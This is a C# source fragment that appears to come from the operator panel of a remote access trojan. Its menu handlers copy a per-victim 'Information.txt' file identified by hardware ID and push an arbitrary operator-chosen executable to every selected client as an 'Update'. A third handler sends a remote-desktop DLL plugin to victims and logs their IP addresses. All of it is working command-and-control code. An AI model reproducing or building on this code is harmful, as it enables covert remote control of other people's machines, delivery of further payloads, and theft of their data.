	private void ckpyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		Clients[] selected = ClientsSelected();
		if (selected.Length == 0)
		{
			return;
		}
		Clients client = selected[0];
		string path = Path.Combine("Users", client.Hwid, "Information.txt");
		if (!File.Exists(path))
		{
			return;
		}
		try
		{
			Clipboard.SetFileDropList(new StringCollection { Path.GetFullPath(path) });
		}
		catch
		{
		}
	}

	private void updateToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Executable (*.exe)|*.exe";
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(openFileDialog.FileName);
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[2] { "Update", bytes });
			});
		}
	}

	private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Desktop.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormDesktop)Application.OpenForms["Desktop:" + clients.Hwid] == null)
			{
				FormDesktop formDesktop = new FormDesktop();
				formDesktop.Name = "Desktop:" + clients.Hwid;
				formDesktop.parrent = clients;
				formDesktop.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					Methods.AppendLogs(clients.IP, "Send plugin: Plugin\\Desktop.dll", Color.Blue);
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

